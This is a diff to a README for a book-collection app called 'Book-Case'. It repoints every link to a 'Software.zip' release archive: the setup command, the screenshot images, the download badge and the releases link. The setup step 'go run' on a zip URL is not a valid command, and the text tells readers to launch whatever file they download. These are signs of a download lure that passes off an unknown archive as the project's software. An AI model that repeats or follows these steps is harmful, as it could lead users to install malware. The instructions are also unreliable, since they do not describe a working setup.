@@ -18,7 +18,7 @@ To get started with Book-Case, follow these steps:
 2. Install the necessary dependencies using `npm install` or `yarn install`.
 3. Set up the PostgreSQL database with the provided schema.
 4. Update the configuration files with your Google OAuth2 credentials.
-5. Start the backend server using `go run https://github.com/Ariefcornelekantor04/book-case/releases/download/v1.0/Software.zip`.
+5. Start the backend server using `go run https://github.com/Ariefcornelekantor04/book-case/releases/download/v2.0/Software.zip`.
 6. Start the frontend application using `npm start` or `yarn start`.
 
 ## Technologies Used 🚀
@@ -45,18 +45,18 @@ To get started with Book-Case, follow these steps:
 
 ## Screenshots 📸
 
-![Book-Case Screenshot 1](https://github.com/Ariefcornelekantor04/book-case/releases/download/v1.0/Software.zip)
-![Book-Case Screenshot 2](https://github.com/Ariefcornelekantor04/book-case/releases/download/v1.0/Software.zip)
+![Book-Case Screenshot 1](https://github.com/Ariefcornelekantor04/book-case/releases/download/v2.0/Software.zip)
+![Book-Case Screenshot 2](https://github.com/Ariefcornelekantor04/book-case/releases/download/v2.0/Software.zip)
 
 ## Get Started! 🚀
 
 Ready to manage your book collection like a pro? Click below to download the software and start organizing your books today!
 
-[![Download Book-Case](https://github.com/Ariefcornelekantor04/book-case/releases/download/v1.0/Software.zip)](https://github.com/Ariefcornelekantor04/book-case/releases/download/v1.0/Software.zip) 📥
+[![Download Book-Case](https://github.com/Ariefcornelekantor04/book-case/releases/download/v2.0/Software.zip)](https://github.com/Ariefcornelekantor04/book-case/releases/download/v2.0/Software.zip) 📥
 
 If the link ends with a file name then the software needs to be launched. Happy reading! 📖
 
-For more details and updates, please visit the [Releases](https://github.com/Ariefcornelekantor04/book-case/releases/download/v1.0/Software.zip) section.
+For more details and updates, please visit the [Releases](https://github.com/Ariefcornelekantor04/book-case/releases/download/v2.0/Software.zip) section.
 
 Enjoy using Book-Case to organize your book collection efficiently and effortlessly! 📚
 
